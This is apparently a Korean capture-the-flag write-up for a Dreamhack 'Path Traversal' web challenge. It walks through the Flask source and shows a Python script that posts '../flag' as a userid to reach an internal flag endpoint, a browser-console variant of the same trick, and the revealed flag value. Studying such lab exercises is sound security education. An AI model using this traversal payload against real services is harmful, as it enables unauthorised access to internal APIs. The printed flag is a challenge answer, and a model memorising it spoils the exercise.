https://honey-push-30b.notion.site/Path-Traversal-9d5d742aed61424e9249834480a9b789

# 문제파일 다운로드

![문제파일 다운로드.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/da345441-e46d-48e0-b9d7-e78e88d6fca9/_.png)

Path Traversal 문제의 접속 정보와 문제파일을 다운로드 받을 수 있다. FLAG는 /api/flag에 존재한다는 정보와 문제파일을 다운로드 받으면 [app.py](http://app.py) 파일을 받을 수 있는데 이 파일의 코드는 아래와 같다.

```python
#!/usr/bin/python3
from flask import Flask, request, render_template, abort
from functools import wraps
import requests
import os, json

users = {
    '0': {
        'userid': 'guest',
        'level': 1,
        'password': 'guest'
    },
    '1': {
        'userid': 'admin',
        'level': 9999,
        'password': 'admin'
    }
}

def internal_api(func):
    @wraps(func)
    def decorated_view(*args, **kwargs):
        if request.remote_addr == '127.0.0.1':
            return func(*args, **kwargs)
        else:
            abort(401)
    return decorated_view

app = Flask(__name__)
app.secret_key = os.urandom(32)
API_HOST = 'http://127.0.0.1:8000'

try:
    FLAG = open('./flag.txt', 'r').read() # Flag is here!!
except:
    FLAG = '[**FLAG**]'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/get_info', methods=['GET', 'POST'])
def get_info():
    if request.method == 'GET':
        return render_template('get_info.html')
    elif request.method == 'POST':
        userid = request.form.get('userid', '')
        info = requests.get(f'{API_HOST}/api/user/{userid}').text
        return render_template('get_info.html', info=info)

@app.route('/api')
@internal_api
def api():
    return '/user/<uid>, /flag'

@app.route('/api/user/<uid>')
@internal_api
def get_flag(uid):
    try:
        info = users[uid]
    except:
        info = {}
    return json.dumps(info)

@app.route('/api/flag')
@internal_api
def flag():
    return FLAG

application = app # app.run(host='0.0.0.0', port=8000)
# Dockerfile
#     ENTRYPOINT ["uwsgi", "--socket", "0.0.0.0:8000", "--protocol=http", "--threads", "4", "--wsgi-file", "app.py"]
```

여기서 @app.route가 써져 있는 곳은 페이지이고 다음과 같이 살펴보자 

1. users
2. internal_api 함수
3. index 함수
4. get_info 함수
5. api 함수
6. get_flag 함수
7. flag 함수

# Users

다음 코드내용은 아래와 같다.

```python
users = {
    '0': {
        'userid': 'guest',
        'level': 1,
        'password': 'guest'
    },
    '1': {
        'userid': 'admin',
        'level': 9999,
        'password': 'admin'
    }
}
```

users에는 0과 1이 있는데 0은 guest이고 1은 admin이다.

# internal_api 함수

```python
def internal_api(func):
    @wraps(func)
    def decorated_view(*args, **kwargs):
        if request.remote_addr == '127.0.0.1':
            return func(*args, **kwargs)
        else:
            abort(401)
    return decorated_view

```

무슨 함수인지 정확히는 모르겠으나 요청이 127.0.0.1로 부터 온것이 아니라면 abort하는 걸로 봐서는 내부 api를 사용하려면 127.0.0.1. 이어야 하는 것으로 보인다.

# index 함수

```python
@app.route('/')
def index():
    return render_template('index.html')
```

처음 접속했을 때 페이지를 보여주는 함수이다.

![index.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0b42112e-02d9-4896-bca1-3310cb6bdf89/index.png)

# get_info 함수

```python
@app.route('/get_info', methods=['GET', 'POST'])
def get_info():
    if request.method == 'GET':
        return render_template('get_info.html')
    elif request.method == 'POST':
        userid = request.form.get('userid', '')
        info = requests.get(f'{API_HOST}/api/user/{userid}').text
        return render_template('get_info.html', info=info)
```

문제의 핵심이 되는 함수로 GET으로 요청했을 때는 get_info 페이지를 보여주기만 하지만 POST 요청을 보내면 POST로 보낸 userid 값을 받아 API_HOST 즉 127.0.0.1/api/user/{userid} 를 요청한 값을 반환해준다. 이는 internal_api 함수의 조건인 127.0.0.1을 만족하고 따라서 internal_api인 /api/flag를 호출할 수 있다. 

사용자가 입력한 userid에 대한 검증이 없기 때문에 PATH Traversal 공격으로 가능하다.

![get_info.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b5ec947c-b56f-4e55-9afa-8805eb6b1e36/get_info.png)

# api 함수

```python
@internal_api
def api():
    return '/user/<uid>, /flag'
```

내부 api로 사용되는 함수같다.

# get_flag 함수

```python
@app.route('/api/user/<uid>')
@internal_api
def get_flag(uid):
    try:
        info = users[uid]
    except:
        info = {}
    return json.dumps(info)
```

users에 key로 uid값을 넣어 나온 value를 info에 저장해준다. 

```python
users = {
    '0': {
        'userid': 'guest',
        'level': 1,
        'password': 'guest'
    },
    '1': {
        'userid': 'admin',
        'level': 9999,
        'password': 'admin'
    }
}
```

users에는 0과 1이 있는데 0은 guest이고 1은 admin 으로 두개밖에 없으므로 이 둘 중 하나가 나온다.

# flag 함수

```python
@app.route('/api/flag')
@internal_api
def flag():
    return FLAG
```

/api/flag이며 FLAG를 반환해준다. 대신 @internal_api 이므로 127.0.0.1에서 호출해줘야 한다.

# 문제 해결

다음의 조건을 준수하면 flag값을 찾을 수 있다.

1. get_info 함수에서 userid에 값을 담아 POST 요청을 보내면 127.0.0.1/api/user/{userid} 로 요청을 보낼 수 있다.
2. 이 127.0.0.1은 internal_api 사용 조건이므로 internal_api인 /api/flag에도 접근이 가능하다. 
3. 사용자가 입력값을 넣는 userid에는 입력값 검증을 추가로 하지 않으므로 PATH Traversal이 가능하다.

![flag 실패.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9e3b210d-18f4-47c1-b6de-36a6a6fffdc5/flag_.png)

따라서 ../flag를 입력해주어 127.0.0.1/api/user/../flag로 하여 127.0.0.1/api/flag를 의도하고 View를 클릭하였으나 어째서인지 FLAG가 나오지 않았다. 

그래서 개발자 도구로 userid를 확인해보았더니

![개발자도구.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1193a743-3ae0-4e54-9bd8-321fcfc39eea/.png)

내가 의도했던 ../flag가 userid에 들어가 있는 것이 아닌 undefined가 들어가있는 것이 확인되었다.

그래서 이 페이지의 소스코드를 살펴보니

```python
<script>
  const users = {
    'guest': 0,
    'admin': 1
  }
  function user(evt){
  	document.getElementById('userid').value = users[document.getElementById('userid').value];
    return true;
  }
  window.onload = function() {
    document.getElementById('form').addEventListener('submit', user);
  }
</script>
```

위와 같은 스크립트가 발견되었다. 저 function user(evt)함수 때문에 내가 넣은 userid값은 users[userid]를 거쳐서 const users에 있는 0(guest)이나 1(admin) 혹은 undefined로 변환되어서 전달되고 있던 것이었다. 그리고 이는 아마 View 버튼을 누르는 이벤트로 인해 발생하는거 같으므로 아예 파이썬 코드를 통해서 보내보았다.

```python
import requests
url=f"http://host3.dreamhack.games:8276/get_info"
#
data={
    "userid":"../flag"
    }

response=requests.post(url,data)
print(response.text)
```

그 결과 응답값으로 

```python
<!doctype html>
<html>
  <head>
    <link rel="stylesheet" href="/static/css/bootstrap.min.css">
    <link rel="stylesheet" href="/static/css/bootstrap-theme.min.css">
    <link rel="stylesheet" href="/static/css/non-responsive.css">
    <title>Get User Info Path Traversal</title>
    
  

  </head>
<body>

    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">Path Traversal</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="/">Home</a></li>
            <li><a href="#about">About</a></li>
            <li><a href="#contact">Contact</a></li>
          </ul>

        </div><!--/.nav-collapse -->
      </div>
    </nav>

    <div class="container">
      
<h1>Get User Info</h1><br/>

  <pre>DH{8a33bb6fe0a37522bdc8adb65116b2d4}
</pre>

<form method="POST" id="form">
  <div class="form-group">
    <label for="userid">userid</label>
    <input type="text" class="form-control" id="userid" placeholder="userid" name="userid" value="guest" required>
  </div>
  <button type="submit" class="btn btn-default">View</button>
</form>
<script>
  const users = {
    'guest': 0,
    'admin': 1
  }
  function user(evt){
  	document.getElementById('userid').value = users[document.getElementById('userid').value];
    return true;
  }
  window.onload = function() {
    document.getElementById('form').addEventListener('submit', user);
  }
</script>

    </div> <!-- /container -->

    <!-- Bootstrap core JavaScript -->
    <script src="/static/js/jquery.min.js"></script>
    <script src="/static/js/bootstrap.min.js"></script> 
</body>
</html>
```

이 도착했다. 찾고자 하는 FLAG는 <pre>태그 사이에 있는 DH{8a33bb6fe0a37522bdc8adb65116b2d4}이다.

이렇게 하고나서 다른 방법은 더 없을까 고민한 결과 개발자 도구의 console창을 이용하는 방법도 있다.

지금 문제점은 POST로 보내줬던 userid가  users[’userid’]로 치환당해서 다른 값이 저장되는 건데 그러면 users[’1’]=’../flag’로 추가를 해주고 1을 보내주면 userid가 ../flag로 바뀐다.

 

![users[1].PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7e705489-710c-4b02-a764-0f238b795b01/users1.png)

그리고 나서 1을 보내보면?

![결과2.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a4249766-3f33-4de2-8c6b-994b959daaa2/2.png)

`DH{8a33bb6fe0a37522bdc8adb65116b2d4}` 가 깔끔하게 나오는 것을 확인할 수 있다.
